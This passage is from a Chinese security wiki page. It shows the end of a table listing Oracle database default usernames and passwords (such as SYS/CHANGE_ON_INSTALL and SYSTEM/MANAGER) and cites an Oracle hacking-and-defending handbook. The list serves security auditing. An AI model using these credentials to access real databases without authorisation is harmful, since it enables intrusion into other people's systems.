<tr>
<td>SSA3</td>
<td>SSA3</td>
</tr>
<tr>
<td>SSC1</td>
<td>SSC1</td>
</tr>
<tr>
<td>SSC2</td>
<td>SSC2</td>
</tr>
<tr>
<td>SSC3</td>
<td>SSC3</td>
</tr>
<tr>
<td>SSOSDK</td>
<td>SSOSDK</td>
</tr>
<tr>
<td>SSP</td>
<td>SSP</td>
</tr>
<tr>
<td>SSS1</td>
<td>SSS1</td>
</tr>
<tr>
<td>SUPPLIER</td>
<td>SUPPLIER</td>
</tr>
<tr>
<td>SVM7333</td>
<td>SVM7333</td>
</tr>
<tr>
<td>SVM7334</td>
<td>SVM7334</td>
</tr>
<tr>
<td>SVM810</td>
<td>SVM810</td>
</tr>
<tr>
<td>SVM811</td>
<td>SVM811</td>
</tr>
<tr>
<td>SVM812</td>
<td>SVM812</td>
</tr>
<tr>
<td>SVM9</td>
<td>SVM9</td>
</tr>
<tr>
<td>SVMB733</td>
<td>SVMB733</td>
</tr>
<tr>
<td>SVP1</td>
<td>SVP1</td>
</tr>
<tr>
<td>SY810</td>
<td>SY810</td>
</tr>
<tr>
<td>SY811</td>
<td>SY811</td>
</tr>
<tr>
<td>SY812</td>
<td>SY812</td>
</tr>
<tr>
<td>SY9</td>
<td>SY9</td>
</tr>
<tr>
<td>SYS</td>
<td>MANAGER</td>
</tr>
<tr>
<td>SYS</td>
<td>CHANGE_ON_INSTALL</td>
</tr>
<tr>
<td>SYS7333</td>
<td>SYS7333</td>
</tr>
<tr>
<td>SYS7334</td>
<td>SYS7334</td>
</tr>
<tr>
<td>SYSADMIN</td>
<td>SYSADMIN</td>
</tr>
<tr>
<td>SYSB733</td>
<td>SYSB733</td>
</tr>
<tr>
<td>SYSTEM</td>
<td>MANAGER</td>
</tr>
<tr>
<td>TDEMARCO</td>
<td>TDEMARCO</td>
</tr>
<tr>
<td>TDOS_ICSAP</td>
<td>TDOS_ICSAP</td>
</tr>
<tr>
<td>TESTCTL</td>
<td>TESTCTL</td>
</tr>
<tr>
<td>TESTDTA</td>
<td>TESTDTA</td>
</tr>
<tr>
<td>TRA1</td>
<td>TRA1</td>
</tr>
<tr>
<td>TRACESVR</td>
<td>TRACE</td>
</tr>
<tr>
<td>TRBM1</td>
<td>TRBM1</td>
</tr>
<tr>
<td>TRCM1</td>
<td>TRCM1</td>
</tr>
<tr>
<td>TRDM1</td>
<td>TRDM1</td>
</tr>
<tr>
<td>TRRM1</td>
<td>TRRM1</td>
</tr>
<tr>
<td>TWILLIAMS</td>
<td>TWILLIAMS</td>
</tr>
<tr>
<td>UDDISYS</td>
<td>UDDISYS</td>
</tr>
<tr>
<td>VEA</td>
<td>VEA</td>
</tr>
<tr>
<td>VEH</td>
<td>VEH</td>
</tr>
<tr>
<td>VIDEO31</td>
<td>VIDEO31</td>
</tr>
<tr>
<td>VIDEO4</td>
<td>VIDEO4</td>
</tr>
<tr>
<td>VIDEO5</td>
<td>VIDEO5</td>
</tr>
<tr>
<td>VP1</td>
<td>VP1</td>
</tr>
<tr>
<td>VP2</td>
<td>VP2</td>
</tr>
<tr>
<td>VP3</td>
<td>VP3</td>
</tr>
<tr>
<td>VP4</td>
<td>VP4</td>
</tr>
<tr>
<td>VP5</td>
<td>VP5</td>
</tr>
<tr>
<td>VP6</td>
<td>VP6</td>
</tr>
<tr>
<td>WAA1</td>
<td>WAA1</td>
</tr>
<tr>
<td>WAA2</td>
<td>WAA2</td>
</tr>
<tr>
<td>WCRSYS</td>
<td>WCRSYS</td>
</tr>
<tr>
<td>WEBDB</td>
<td>WEBDB</td>
</tr>
<tr>
<td>WEBSYS</td>
<td>WELCOME</td>
</tr>
<tr>
<td>WENDYCHO</td>
<td>WENDYCHO</td>
</tr>
<tr>
<td>WH</td>
<td>WH</td>
</tr>
<tr>
<td>WIP</td>
<td>WIP</td>
</tr>
<tr>
<td>WIRELESS</td>
<td>WELCOME</td>
</tr>
<tr>
<td>WIRELESS</td>
<td>WIRELESS</td>
</tr>
<tr>
<td>WK_TEST</td>
<td>WK_TEST</td>
</tr>
<tr>
<td>WKPROXY</td>
<td>WKPROXY</td>
</tr>
<tr>
<td>WKSYS</td>
<td>WKSYS</td>
</tr>
<tr>
<td>WMS</td>
<td>WMS</td>
</tr>
<tr>
<td>WMSYS</td>
<td>WMSYS</td>
</tr>
<tr>
<td>WPS</td>
<td>WPS</td>
</tr>
<tr>
<td>WSH</td>
<td>WSH</td>
</tr>
<tr>
<td>WSM</td>
<td>WSM</td>
</tr>
<tr>
<td>XDB</td>
<td>CHANGE_ON_INSTALL</td>
</tr>
<tr>
<td>XDO</td>
<td>XDO</td>
</tr>
<tr>
<td>XDP</td>
<td>XDP</td>
</tr>
<tr>
<td>XLA</td>
<td>XLA</td>
</tr>
<tr>
<td>XLE</td>
<td>XLE</td>
</tr>
<tr>
<td>XNB</td>
<td>XNB</td>
</tr>
<tr>
<td>XNC</td>
<td>XNC</td>
</tr>
<tr>
<td>XNI</td>
<td>XNI</td>
</tr>
<tr>
<td>XNM</td>
<td>XNM</td>
</tr>
<tr>
<td>XNP</td>
<td>XNP</td>
</tr>
<tr>
<td>XNS</td>
<td>XNS</td>
</tr>
<tr>
<td>XTR</td>
<td>XTR</td>
</tr>
<tr>
<td>YCAMPOS</td>
<td>YCAMPOS</td>
</tr>
<tr>
<td>YSANCHEZ</td>
<td>YSANCHEZ</td>
</tr>
<tr>
<td>ZFA</td>
<td>ZFA</td>
</tr>
<tr>
<td>ZPB</td>
<td>ZPB</td>
</tr>
<tr>
<td>ZSA</td>
<td>ZSA</td>
</tr>
</tbody></table>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<ul>
<li>The Oracle Hacker’s Handbook: Hacking  and Defending Oracle</li>
</ul>
</blockquote>

            </div>
        
        <footer class="article-footer">
        </footer>
    </div>
</article>


    
<nav id="article-nav">
    
        <a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" id="article-nav-newer" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Newer</strong>
            <div class="article-nav-title">
                
                    Windows应急响应
                
            </div>
        </a>
    
    
        <a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/" id="article-nav-older" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Older</strong>
            <div class="article-nav-title">The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 上篇</div>
        </a>
    
</nav>





    
    




<!-- baidu url auto push script -->
<script type="text/javascript">
    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
</script>     
</section>
        </div>
        <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            Tahir &copy; 2021 
            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
            
                <br>
                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
                &nbsp;|&nbsp;
                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
            
        </div>
    </div>
</footer>
        

    
        
<script src="/libs/lightgallery/js/lightgallery.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-pager.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-hash.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-share.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-video.min.js"></script>

    
    
        
<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>

    
    
        <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true,
            TeX: {
                equationNumbers: {
                  autoNumber: 'AMS'
                }
            }
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    



<!-- Custom Scripts -->

<script src="/js/main.js"></script>


    </div>
</body>
</html>